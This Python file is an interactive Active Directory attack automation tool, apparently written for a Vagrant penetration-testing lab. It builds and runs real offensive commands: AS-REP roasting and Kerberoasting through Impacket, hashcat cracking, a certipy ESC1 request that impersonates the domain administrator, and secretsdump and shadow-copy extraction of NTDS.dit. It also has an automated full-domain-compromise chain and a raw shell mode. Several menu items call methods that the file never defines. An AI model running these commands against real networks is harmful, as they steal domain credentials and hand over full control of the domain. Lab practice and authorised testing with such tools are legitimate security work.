#!/usr/bin/env python3
"""
AD Attack Automation Tool for Penetration Testing Lab
Targets: DC01, DB01, CA01, WIN10 in the lab.local domain
Author: [Your Name]
Version: 1.0
"""

import os
import sys
import json
import argparse
import subprocess
import time
from datetime import datetime
from typing import Dict, List, Optional
import socket
import ipaddress
from dataclasses import dataclass
from enum import Enum
import yaml
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.prompt import Prompt, Confirm
from rich.layout import Layout
from rich.text import Text
import asyncio
import aiofiles
import requests
from pathlib import Path

# Color constants for output


class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


@dataclass
class Target:
    """Target machine configuration"""
    name: str
    ip: str
    domain: str
    os: str
    services: List[str]
    credentials: Dict[str, str]
    vulnerabilities: List[str]


class AttackType(Enum):
    """Enumeration of attack types"""
    RECON = "Reconnaissance"
    INITIAL_ACCESS = "Initial Access"
    LATERAL_MOVEMENT = "Lateral Movement"
    PRIVILEGE_ESCALATION = "Privilege Escalation"
    DOMAIN_PERSISTENCE = "Domain Persistence"
    CERTIFICATE_ATTACKS = "Certificate Attacks"
    POST_EXPLOITATION = "Post-Exploitation"


class ADAttackAutomator:
    """Main class for AD attack automation"""

    def __init__(self, config_file: str = "lab_config.yaml"):
        self.console = Console()
        self.config_file = config_file
        self.targets = self._load_config()
        self.results = {}
        self.session_data = {}

        # Default lab configuration
        self.lab_config = {
            "domain": "lab.local",
            "dc_ip": "172.28.128.21",
            "subnet": "172.28.128.0/24",
            "kali_ip": "172.28.128.10",
            "tools": {
                "bloodhound": "bloodhound-python",
                "crackmapexec": "crackmapexec",
                "impacket": "/usr/share/doc/python3-impacket/examples/",
                "certipy": "certipy",
                "kerbrute": "kerbrute",
                "enum4linux": "enum4linux-ng"
            }
        }

    def _load_config(self) -> Dict[str, Target]:
        """Load target configuration from YAML file"""
        config_path = Path(self.config_file)
        if config_path.exists():
            with open(config_path, 'r') as f:
                config_data = yaml.safe_load(f)

            targets = {}
            for target_name, target_data in config_data.get('targets', {}).items():
                targets[target_name] = Target(**target_data)
            return targets
        else:
            # Default configuration based on Vagrantfile
            return self._get_default_targets()

    def _get_default_targets(self) -> Dict[str, Target]:
        """Return default target configuration based on Vagrantfile"""
        return {
            "DC01": Target(
                name="DC01",
                ip="172.28.128.21",
                domain="lab.local",
                os="Windows Server 2022",
                services=["AD DS", "DNS", "LDAP", "SMB", "WinRM"],
                credentials={
                    "vagrant": "vagrant",
                    "vagrant_domain": "Vagrant123!",
                    "administrator": "Passw0rd!",
                    "alice.adams": "Passw0rd!",
                    "bob.builder": "Passw0rd!",
                    "dave.evans": "Passw0rd!"
                },
                vulnerabilities=[
                    "AS-REP Roasting",
                    "Kerberoasting",
                    "ACL Abuse",
                    "GPP Passwords",
                    "SMB Relay",
                    "AdminSDHolder"
                ]
            ),
            "DB01": Target(
                name="DB01",
                ip="172.28.128.23",
                domain="lab.local",
                os="Windows Server 2019",
                services=["SQL Server", "SMB", "WinRM", "RPC"],
                credentials={
                    "vagrant": "vagrant",
                    "localadmin": "Welcome1!",
                    "svc_kerberoast": "ServiceP@ss2"
                },
                vulnerabilities=[
                    "Kerberoasting",
                    "SMB Relay",
                    "Credential Reuse",
                    "Weak SMB Share"
                ]
            ),
            "CA01": Target(
                name="CA01",
                ip="172.28.128.24",
                domain="lab.local",
                os="Windows Server 2022",
                services=["AD CS", "SMB", "WinRM", "HTTP"],
                credentials={
                    "vagrant": "vagrant",
                    "alice.adams": "Passw0rd!"
                },
                vulnerabilities=[
                    "ESC1 Template Misconfiguration",
                    "ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2",
                    "ESC8 Web Enrollment Relay",
                    "ESC9 Weak Certificate Binding"
                ]
            ),
            "WIN10": Target(
                name="WIN10",
                ip="172.28.128.30",
                domain="lab.local",
                os="Windows 10 Enterprise",
                services=["SMB", "WinRM", "RDP"],
                credentials={
                    "vagrant": "vagrant",
                    "alice.adams": "Passw0rd!"
                },
                vulnerabilities=[
                    "Credential Reuse",
                    "Lateral Movement",
                    "Unconstrained Delegation"
                ]
            )
        }

    def save_config(self):
        """Save current configuration to YAML file"""
        config_data = {
            'targets': {
                name: {
                    'name': target.name,
                    'ip': target.ip,
                    'domain': target.domain,
                    'os': target.os,
                    'services': target.services,
                    'credentials': target.credentials,
                    'vulnerabilities': target.vulnerabilities
                }
                for name, target in self.targets.items()
            }
        }

        with open(self.config_file, 'w') as f:
            yaml.dump(config_data, f, default_flow_style=False)

        self.console.print(
            f"[green]Configuration saved to {self.config_file}[/green]")

    def display_banner(self):
        """Display tool banner"""
        banner = f"""{Colors.HEADER}{Colors.BOLD}
╔════════════════════════════════════════════════════════════════════════╗
║                    AD ATTACK AUTOMATION TOOL                           ║
║                    Penetration Testing Lab                             ║
║                    Targets: DC01, DB01, CA01, WIN10                    ║
╚════════════════════════════════════════════════════════════════════════╝{Colors.END}
"""
        self.console.print(banner)

    def display_targets(self):
        """Display all targets in a table"""
        table = Table(title="Lab Targets", show_header=True,
                      header_style="bold magenta")
        table.add_column("Name", style="cyan", width=10)
        table.add_column("IP Address", style="green", width=15)
        table.add_column("OS", style="yellow", width=20)
        table.add_column("Services", style="blue", width=30)
        table.add_column("Vulnerabilities", style="red", width=40)

        for target in self.targets.values():
            services_str = "\n".join(target.services[:3])
            vulns_str = "\n".join(target.vulnerabilities[:3])
            table.add_row(
                target.name,
                target.ip,
                target.os,
                services_str,
                vulns_str
            )

        self.console.print(table)

    def check_connectivity(self):
        """Check connectivity to all targets"""
        self.console.print(
            Panel.fit("Checking Target Connectivity", style="bold blue"))

        results = []
        for name, target in self.targets.items():
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                transient=True,
            ) as progress:
                task = progress.add_task(
                    f"Checking {name} ({target.ip})...", total=None)

                # Try ICMP ping first
                ping_result = self._ping_host(target.ip)

                # Try common ports
                ports_result = self._check_ports(
                    target.ip, [445, 139, 389, 636, 88, 135])

                status = "✅" if ping_result or ports_result else "❌"
                result_text = f"{status} {name} ({target.ip})"

                if ping_result:
                    result_text += " - ICMP reachable"
                if ports_result:
                    open_ports = [str(p) for p in ports_result]
                    result_text += f" - Open ports: {', '.join(open_ports)}"

                results.append(result_text)

        self.console.print("\n".join(results))

    def _ping_host(self, ip: str) -> bool:
        """Check if host is reachable via ICMP"""
        try:
            # Use system ping with timeout
            result = subprocess.run(
                ['ping', '-c', '1', '-W', '1', ip],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            return result.returncode == 0
        except:
            return False

    def _check_ports(self, ip: str, ports: List[int]) -> List[int]:
        """Check which ports are open on target"""
        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        return open_ports

    def run_attack_menu(self):
        """Display main attack menu"""
        while True:
            self.console.clear()
            self.display_banner()

            menu_options = [
                ("1", "Reconnaissance & Enumeration"),
                ("2", "Initial Access Attacks"),
                ("3", "Lateral Movement"),
                ("4", "Privilege Escalation"),
                ("5", "Domain Persistence"),
                ("6", "Certificate Services Attacks (AD CS)"),
                ("7", "Post-Exploitation"),
                ("8", "Target-Specific Attacks"),
                ("9", "Automated Attack Chain"),
                ("C", "Check Connectivity"),
                ("T", "View Targets"),
                ("S", "Save Configuration"),
                ("X", "Exit")
            ]

            # Display menu
            for option, description in menu_options:
                self.console.print(f"[cyan]{option}[/cyan]. {description}")

            choice = Prompt.ask("\nSelect option", choices=[
                                opt[0] for opt in menu_options])

            if choice == '1':
                self.recon_menu()
            elif choice == '2':
                self.initial_access_menu()
            elif choice == '3':
                self.lateral_movement_menu()
            elif choice == '4':
                self.privilege_escalation_menu()
            elif choice == '5':
                self.domain_persistence_menu()
            elif choice == '6':
                self.certificate_attacks_menu()
            elif choice == '7':
                self.post_exploitation_menu()
            elif choice == '8':
                self.target_specific_menu()
            elif choice == '9':
                self.automated_attack_chain()
            elif choice == 'C':
                self.check_connectivity()
                input("\nPress Enter to continue...")
            elif choice == 'T':
                self.display_targets()
                input("\nPress Enter to continue...")
            elif choice == 'S':
                self.save_config()
                input("\nPress Enter to continue...")
            elif choice == 'X':
                self.console.print("[yellow]Exiting...[/yellow]")
                break

    def recon_menu(self):
        """Reconnaissance and enumeration menu"""
        while True:
            self.console.clear()
            self.console.print(
                Panel.fit("Reconnaissance & Enumeration", style="bold blue"))

            recon_options = [
                ("1", "Network Discovery (nmap)"),
                ("2", "SMB Enumeration"),
                ("3", "LDAP/LDAPS Enumeration"),
                ("4", "Kerberos Enumeration"),
                ("5", "DNS Enumeration"),
                ("6", "BloodHound Data Collection"),
                ("7", "Domain Users Enumeration"),
                ("8", "Domain Computers Enumeration"),
                ("9", "GPP Password Search"),
                ("B", "Back to Main Menu")
            ]

            for option, description in recon_options:
                self.console.print(f"[cyan]{option}[/cyan]. {description}")

            choice = Prompt.ask("\nSelect option", choices=[
                                opt[0] for opt in recon_options])

            if choice == '1':
                self.network_discovery()
            elif choice == '2':
                self.smb_enumeration()
            elif choice == '3':
                self.ldap_enumeration()
            elif choice == '4':
                self.kerberos_enumeration()
            elif choice == '5':
                self.dns_enumeration()
            elif choice == '6':
                self.bloodhound_collection()
            elif choice == '7':
                self.domain_users_enum()
            elif choice == '8':
                self.domain_computers_enum()
            elif choice == '9':
                self.gpp_search()
            elif choice == 'B':
                break

    def network_discovery(self):
        """Perform network discovery with nmap"""
        self.console.print(Panel.fit("Network Discovery", style="bold blue"))

        target_ip = Prompt.ask("Enter target IP or subnet",
                               default=self.lab_config["subnet"])

        scan_type = Prompt.ask("Select scan type",
                               choices=["1", "2", "3"],
                               default="1",
                               show_choices=True,
                               show_default=True)

        scan_commands = {
            "1": f"nmap -sV -sC -O {target_ip}",
            "2": f"nmap -sS -p- {target_ip}",
            "3": f"nmap -sU --top-ports 100 {target_ip}"
        }

        command = scan_commands[scan_type]

        if Confirm.ask(f"Run: {command}?"):
            self.console.print(f"[yellow]Running: {command}[/yellow]")
            try:
                result = subprocess.run(
                    command, shell=True, capture_output=True, text=True)
                self.console.print(
                    f"\n[green]Output:[/green]\n{result.stdout}")
                if result.stderr:
                    self.console.print(f"[red]Errors:[/red]\n{result.stderr}")
            except Exception as e:
                self.console.print(f"[red]Error: {e}[/red]")

        input("\nPress Enter to continue...")

    def smb_enumeration(self):
        """Perform SMB enumeration"""
        self.console.print(Panel.fit("SMB Enumeration", style="bold blue"))

        target = self._select_target()
        if not target:
            return

        self.console.print(
            f"\n[yellow]Enumerating SMB on {target.name} ({target.ip})[/yellow]")

        # Try enum4linux-ng
        self.console.print("\n[cyan]Running enum4linux-ng...[/cyan]")
        command = f"enum4linux-ng {target.ip} -A"
        self._run_command(command)

        # Try crackmapexec
        self.console.print("\n[cyan]Running crackmapexec SMB scan...[/cyan]")
        command = f"crackmapexec smb {target.ip} --shares"
        self._run_command(command)

        # Check for null session
        self.console.print("\n[cyan]Checking for null session...[/cyan]")
        command = f"smbclient -L //{target.ip} -N"
        self._run_command(command)

        input("\nPress Enter to continue...")

    def _select_target(self) -> Optional[Target]:
        """Select a target from the list"""
        self.console.print("\nAvailable targets:")
        for i, (name, target) in enumerate(self.targets.items(), 1):
            self.console.print(f"{i}. {name} ({target.ip})")

        choice = Prompt.ask("Select target (number or name)", default="1")

        try:
            # Try numeric selection
            if choice.isdigit():
                index = int(choice) - 1
                if 0 <= index < len(self.targets):
                    return list(self.targets.values())[index]
            # Try name selection
            elif choice.upper() in self.targets:
                return self.targets[choice.upper()]
        except:
            pass

        self.console.print("[red]Invalid selection[/red]")
        return None

    def _run_command(self, command: str, capture: bool = False):
        """Run a shell command and display output"""
        try:
            if capture:
                result = subprocess.run(
                    command, shell=True, capture_output=True, text=True)
                return result.stdout, result.stderr
            else:
                subprocess.run(command, shell=True)
        except Exception as e:
            self.console.print(f"[red]Error running command: {e}[/red]")
            return None, None

    def initial_access_menu(self):
        """Initial access attacks menu"""
        while True:
            self.console.clear()
            self.console.print(
                Panel.fit("Initial Access Attacks", style="bold red"))

            access_options = [
                ("1", "AS-REP Roasting"),
                ("2", "Kerberoasting"),
                ("3", "Password Spraying"),
                ("4", "SMB Relay Attack"),
                ("5", "LLMNR/NBT-NS Poisoning"),
                ("6", "Credential Harvesting"),
                ("7", "GPP Password Extraction"),
                ("B", "Back to Main Menu")
            ]

            for option, description in access_options:
                self.console.print(f"[cyan]{option}[/cyan]. {description}")

            choice = Prompt.ask("\nSelect option", choices=[
                                opt[0] for opt in access_options])

            if choice == '1':
                self.asrep_roast()
            elif choice == '2':
                self.kerberoasting()
            elif choice == '3':
                self.password_spray()
            elif choice == '4':
                self.smb_relay()
            elif choice == '5':
                self.llmnr_poisoning()
            elif choice == '6':
                self.credential_harvesting()
            elif choice == '7':
                self.gpp_extraction()
            elif choice == 'B':
                break

    def asrep_roast(self):
        """Perform AS-REP Roasting attack"""
        self.console.print(Panel.fit("AS-REP Roasting", style="bold red"))

        target = self.targets["DC01"]

        # Method 1: Using Impacket's GetNPUsers
        self.console.print(
            "\n[cyan]Method 1: Using Impacket GetNPUsers[/cyan]")
        command = f"python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {self.lab_config['domain']}/ -dc-ip {target.ip} -request"
        self._run_command(command)

        # Method 2: Using bloodhound-python
        self.console.print("\n[cyan]Method 2: Using bloodhound-python[/cyan]")
        command = f"bloodhound-python -u 'alice.adams' -p 'Passw0rd!' -d {self.lab_config['domain']} -dc {target.name}.{self.lab_config['domain']} --asrep"
        self._run_command(command)

        input("\nPress Enter to continue...")

    def kerberoasting(self):
        """Perform Kerberoasting attack"""
        self.console.print(Panel.fit("Kerberoasting", style="bold red"))

        target = self.targets["DC01"]

        # Get user credentials
        username = Prompt.ask("Enter username", default="alice.adams")
        password = Prompt.ask(
            "Enter password", default="Passw0rd!", password=True)

        # Method 1: Using Impacket's GetUserSPNs
        self.console.print(
            "\n[cyan]Method 1: Using Impacket GetUserSPNs[/cyan]")
        command = f"python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py {self.lab_config['domain']}/{username}:{password} -dc-ip {target.ip} -request"
        self._run_command(command)

        # Method 2: Using Rubeus
        self.console.print(
            "\n[cyan]Method 2: Manual approach (for Windows)[/cyan]")
        self.console.print("""
On a Windows machine with Rubeus:
1. Rubeus.exe kerberoast /outfile:hashes.txt
2. Then crack with hashcat: hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
        """)

        input("\nPress Enter to continue...")

    def certificate_attacks_menu(self):
        """AD Certificate Services attacks menu"""
        while True:
            self.console.clear()
            self.console.print(
                Panel.fit("AD Certificate Services Attacks", style="bold green"))

            cert_options = [
                ("1", "ESC1 - Template Misconfiguration"),
                ("2", "ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2"),
                ("3", "ESC8 - Web Enrollment Relay"),
                ("4", "ESC9 - Weak Certificate Binding"),
                ("5", "Certipy Reconnaissance"),
                ("6", "Certificate Template Enumeration"),
                ("7", "Request Certificate with ESC1"),
                ("8", "Web Enrollment Exploitation"),
                ("B", "Back to Main Menu")
            ]

            for option, description in cert_options:
                self.console.print(f"[cyan]{option}[/cyan]. {description}")

            choice = Prompt.ask("\nSelect option", choices=[
                                opt[0] for opt in cert_options])

            if choice == '1':
                self.esc1_attack()
            elif choice == '2':
                self.esc6_attack()
            elif choice == '3':
                self.esc8_attack()
            elif choice == '4':
                self.esc9_attack()
            elif choice == '5':
                self.certipy_recon()
            elif choice == '6':
                self.cert_template_enum()
            elif choice == '7':
                self.request_certificate_esc1()
            elif choice == '8':
                self.web_enrollment_exploit()
            elif choice == 'B':
                break

    def certipy_recon(self):
        """Perform Certipy reconnaissance"""
        self.console.print(
            Panel.fit("Certipy Reconnaissance", style="bold green"))

        target = self.targets["CA01"]

        # Get credentials
        username = Prompt.ask("Enter username", default="alice.adams")
        password = Prompt.ask(
            "Enter password", default="Passw0rd!", password=True)

        # Certipy find command
        self.console.print("\n[cyan]Running Certipy find...[/cyan]")
        command = f"certipy find -u {username}@{self.lab_config['domain']} -p '{password}' -dc-ip {self.lab_config['dc_ip']}"
        self._run_command(command)

        # Check for vulnerable templates
        self.console.print(
            "\n[cyan]Checking for vulnerable templates...[/cyan]")
        command = f"certipy find -u {username}@{self.lab_config['domain']} -p '{password}' -dc-ip {self.lab_config['dc_ip']} -vulnerable"
        self._run_command(command)

        input("\nPress Enter to continue...")

    def esc1_attack(self):
        """Perform ESC1 attack"""
        self.console.print(
            Panel.fit("ESC1 Attack - Template Misconfiguration", style="bold green"))

        self.console.print("""
ESC1 Requirements:
1. Certificate template allows low-privileged users to enroll
2. Template defines EKU for Client Authentication
3. Manager approval disabled
4. No authorized signatures required
5. Subject Alternative Name (SAN) can be specified by requester
        """)

        # Using Certipy for ESC1
        username = Prompt.ask("Enter username", default="alice.adams")
        password = Prompt.ask(
            "Enter password", default="Passw0rd!", password=True)
        template = Prompt.ask(
            "Enter vulnerable template name", default="VulnESC1")

        self.console.print(
            f"\n[cyan]Attempting ESC1 attack with template: {template}[/cyan]")

        # Request certificate
        command = f"certipy req -u {username}@{self.lab_config['domain']} -p '{password}' -dc-ip {self.lab_config['dc_ip']} -ca {self.lab_config['domain']}-{self.targets['CA01'].name}-CA -template {template} -upn administrator@{self.lab_config['domain']}"

        if Confirm.ask(f"Run: {command}?"):
            self._run_command(command)

        input("\nPress Enter to continue...")

    def target_specific_menu(self):
        """Target-specific attack menu"""
        while True:
            self.console.clear()
            self.console.print(
                Panel.fit("Target-Specific Attacks", style="bold yellow"))

            # Display targets
            for i, (name, target) in enumerate(self.targets.items(), 1):
                self.console.print(f"{i}. {name} - {target.os}")

            choice = Prompt.ask(
                "\nSelect target (number or B to go back)", default="1")

            if choice.upper() == 'B':
                break

            try:
                if choice.isdigit():
                    index = int(choice) - 1
                    target_names = list(self.targets.keys())
                    if 0 <= index < len(target_names):
                        target_name = target_names[index]
                        self._target_specific_attacks(target_name)
            except:
                self.console.print("[red]Invalid selection[/red]")
                time.sleep(1)

    def _target_specific_attacks(self, target_name: str):
        """Display target-specific attacks"""
        target = self.targets[target_name]

        while True:
            self.console.clear()
            self.console.print(
                Panel.fit(f"{target_name} Specific Attacks", style="bold yellow"))
            self.console.print(f"IP: {target.ip} | OS: {target.os}")

            # Target-specific attack options
            if target_name == "DC01":
                attacks = [
                    ("1", "Dump NTDS.dit with secretsdump"),
                    ("2", "Extract Kerberos tickets"),
                    ("3", "Golden Ticket Attack"),
                    ("4", "Silver Ticket Attack"),
                    ("5", "DCSync Attack"),
                    ("6", "AdminSDHolder Modification"),
                    ("7", "Skeleton Key Attack"),
                    ("8", "DNS Admins Privilege Escalation")
                ]
            elif target_name == "DB01":
                attacks = [
                    ("1", "SQL Server Enumeration"),
                    ("2", "xp_cmdshell Exploitation"),
                    ("3", "Linked SQL Server Attack"),
                    ("4", "Steal SQL Service Account Hash"),
                    ("5", "CLR Assembly Attack")
                ]
            elif target_name == "CA01":
                attacks = [
                    ("1", "Enumerate Certificate Templates"),
                    ("2", "ESC1 - Request Admin Certificate"),
                    ("3", "ESC8 - Web Enrollment Relay Setup"),
                    ("4", "Dump CA Configuration"),
                    ("5", "Theft of CA Private Key")
                ]
            elif target_name == "WIN10":
                attacks = [
                    ("1", "Token Impersonation"),
                    ("2", "Unconstrained Delegation Abuse"),
                    ("3", "Kerberos Delegation Attacks"),
                    ("4", "Mimikatz Dump Credentials"),
                    ("5", "LSASS Memory Dump")
                ]
            else:
                attacks = [("1", "Basic Enumeration")]

            attacks.append(("B", "Back to Target Selection"))

            for option, description in attacks:
                self.console.print(f"[cyan]{option}[/cyan]. {description}")

            choice = Prompt.ask("\nSelect attack", choices=[
                                opt[0] for opt in attacks])

            if choice == 'B':
                break
            elif choice == '1' and target_name == "DC01":
                self.dump_ntds()
            elif choice == '1' and target_name == "DB01":
                self.sql_server_enum()
            # Add more attack implementations as needed

    def dump_ntds(self):
        """Dump NTDS.dit from DC"""
        self.console.print(Panel.fit("Dumping NTDS.dit", style="bold yellow"))

        target = self.targets["DC01"]

        # Get credentials
        username = Prompt.ask("Enter username", default="administrator")
        password = Prompt.ask(
            "Enter password", default="Passw0rd!", password=True)

        # Method 1: Using secretsdump
        self.console.print("\n[cyan]Method 1: Impacket secretsdump[/cyan]")
        command = f"python3 /usr/share/doc/python3-impacket/examples/secretsdump.py {self.lab_config['domain']}/{username}:{password}@{target.ip}"

        if Confirm.ask(f"Run: {command}?"):
            self._run_command(command)

        # Method 2: Volume Shadow Copy
        self.console.print(
            "\n[cyan]Method 2: Volume Shadow Copy Technique[/cyan]")
        self.console.print("""
On Windows with administrative access:
1. vssadmin create shadow /for=C:
2. copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[X]\\Windows\\NTDS\\ntds.dit .
3. reg save HKLM\\SYSTEM system.save
4. Use secretsdump.py offline: secretsdump.py -ntds ntds.dit -system system.save LOCAL
        """)

        input("\nPress Enter to continue...")

    def automated_attack_chain(self):
        """Run automated attack chain"""
        self.console.print(
            Panel.fit("Automated Attack Chain", style="bold magenta"))

        chain_options = [
            ("1", "Full Domain Compromise Chain"),
            ("2", "Kerberoasting -> Lateral Movement"),
            ("3", "AS-REP -> DCSync -> Golden Ticket"),
            ("4", "ESC1 -> Domain Admin"),
            ("5", "Custom Chain Builder")
        ]

        for option, description in chain_options:
            self.console.print(f"[cyan]{option}[/cyan]. {description}")

        choice = Prompt.ask("\nSelect chain", choices=[
                            opt[0] for opt in chain_options])

        if choice == '1':
            self.full_domain_compromise_chain()
        elif choice == '2':
            self.kerberoast_lateral_chain()
        elif choice == '4':
            self.esc1_domain_admin_chain()

    def full_domain_compromise_chain(self):
        """Execute full domain compromise chain"""
        self.console.print(
            Panel.fit("Full Domain Compromise Chain", style="bold magenta"))

        with Progress() as progress:
            task1 = progress.add_task(
                "[cyan]Step 1: Reconnaissance...", total=100)
            self._reconnaissance_phase()
            progress.update(task1, completed=100)

            task2 = progress.add_task(
                "[cyan]Step 2: Initial Access...", total=100)
            self._initial_access_phase()
            progress.update(task2, completed=100)

            task3 = progress.add_task(
                "[cyan]Step 3: Lateral Movement...", total=100)
            self._lateral_movement_phase()
            progress.update(task3, completed=100)

            task4 = progress.add_task(
                "[cyan]Step 4: Privilege Escalation...", total=100)
            self._privilege_escalation_phase()
            progress.update(task4, completed=100)

            task5 = progress.add_task(
                "[cyan]Step 5: Domain Persistence...", total=100)
            self._domain_persistence_phase()
            progress.update(task5, completed=100)

        self.console.print("\n[green]✓ Full attack chain completed![/green]")
        input("\nPress Enter to continue...")

    def _reconnaissance_phase(self):
        """Automated reconnaissance phase"""
        # Network discovery
        self.console.print("\n[yellow]Running network discovery...[/yellow]")
        command = f"nmap -sV -sC {self.lab_config['subnet']}"
        self._run_command(command, capture=True)

        # SMB enumeration on DC
        self.console.print("\n[yellow]Enumerating SMB on DC...[/yellow]")
        command = f"crackmapexec smb {self.lab_config['dc_ip']} --shares"
        self._run_command(command, capture=True)

        # LDAP enumeration
        self.console.print("\n[yellow]Enumerating LDAP...[/yellow]")
        command = f"ldapsearch -x -H ldap://{self.lab_config['dc_ip']} -b 'dc=lab,dc=local'"
        self._run_command(command, capture=True)

    def _initial_access_phase(self):
        """Automated initial access phase"""
        # Try AS-REP roasting
        self.console.print("\n[yellow]Attempting AS-REP roasting...[/yellow]")
        command = f"python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {self.lab_config['domain']}/ -dc-ip {self.lab_config['dc_ip']} -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt"
        self._run_command(command, capture=True)

        # Try Kerberoasting
        self.console.print("\n[yellow]Attempting Kerberoasting...[/yellow]")
        command = f"python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py {self.lab_config['domain']}/alice.adams:Passw0rd! -dc-ip {self.lab_config['dc_ip']} -request -outputfile kerberoast_hashes.txt"
        self._run_command(command, capture=True)

    def generate_report(self):
        """Generate attack report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"attack_report_{timestamp}.md"

        with open(report_file, 'w') as f:
            f.write(f"# AD Attack Automation Report\n\n")
            f.write(
                f"**Date**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            f.write(f"**Lab Domain**: {self.lab_config['domain']}\n\n")

            f.write("## Targets\n\n")
            for name, target in self.targets.items():
                f.write(f"### {name}\n")
                f.write(f"- IP: {target.ip}\n")
                f.write(f"- OS: {target.os}\n")
                f.write(
                    f"- Vulnerabilities: {', '.join(target.vulnerabilities)}\n\n")

            f.write("## Attack Results\n\n")
            # Add attack results here

            f.write("## Recommendations\n\n")
            f.write("1. Enable SMB signing on all hosts\n")
            f.write("2. Remove vulnerable certificate templates\n")
            f.write("3. Implement LAPS for local administrator passwords\n")
            f.write("4. Regular AD security audits\n")
            f.write("5. Monitor for Kerberoasting and AS-REP roasting attempts\n")

        self.console.print(f"[green]Report generated: {report_file}[/green]")
        return report_file

    def interactive_shell(self):
        """Start interactive shell for manual commands"""
        self.console.print(
            Panel.fit("Interactive Shell Mode", style="bold cyan"))
        self.console.print("[yellow]Type 'exit' to return to menu[/yellow]\n")

        while True:
            try:
                command = Prompt.ask("[shell] $")
                if command.lower() in ['exit', 'quit']:
                    break

                if command.strip():
                    result = subprocess.run(
                        command, shell=True, capture_output=True, text=True)
                    self.console.print(result.stdout)
                    if result.stderr:
                        self.console.print(f"[red]{result.stderr}[/red]")
            except KeyboardInterrupt:
                self.console.print(
                    "\n[yellow]Use 'exit' to return to menu[/yellow]")
            except Exception as e:
                self.console.print(f"[red]Error: {e}[/red]")

    def run(self):
        """Main run method"""
        try:
            self.display_banner()
            self.check_connectivity()

            # Check for required tools
            self._check_tools()

            self.run_attack_menu()

            # Generate report on exit
            if Confirm.ask("Generate attack report?"):
                report_file = self.generate_report()
                self.console.print(
                    f"[green]Report saved to {report_file}[/green]")

        except KeyboardInterrupt:
            self.console.print("\n[yellow]Interrupted by user[/yellow]")
        except Exception as e:
            self.console.print(f"[red]Error: {e}[/red]")
            import traceback
            traceback.print_exc()

    def _check_tools(self):
        """Check for required tools"""
        required_tools = ['nmap', 'crackmapexec', 'smbclient', 'ldapsearch']

        self.console.print("\n[cyan]Checking for required tools...[/cyan]")

        missing_tools = []
        for tool in required_tools:
            try:
                subprocess.run(['which', tool],
                               capture_output=True, check=True)
                self.console.print(f"  [green]✓ {tool}[/green]")
            except:
                missing_tools.append(tool)
                self.console.print(f"  [red]✗ {tool}[/red]")

        if missing_tools:
            self.console.print(
                f"\n[yellow]Missing tools: {', '.join(missing_tools)}[/yellow]")
            self.console.print(
                "Install with: sudo apt install " + " ".join(missing_tools))


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='AD Attack Automation Tool')
    parser.add_argument(
        '-c', '--config', help='Configuration file', default='lab_config.yaml')
    parser.add_argument('-t', '--target', help='Specific target to attack')
    parser.add_argument('-a', '--attack', help='Specific attack to run')
    parser.add_argument('-i', '--interactive',
                        action='store_true', help='Interactive mode')

    args = parser.parse_args()

    automator = ADAttackAutomator(config_file=args.config)

    if args.interactive:
        automator.interactive_shell()
    elif args.attack and args.target:
        # Run specific attack on specific target
        pass
    else:
        automator.run()


if __name__ == "__main__":
    main()
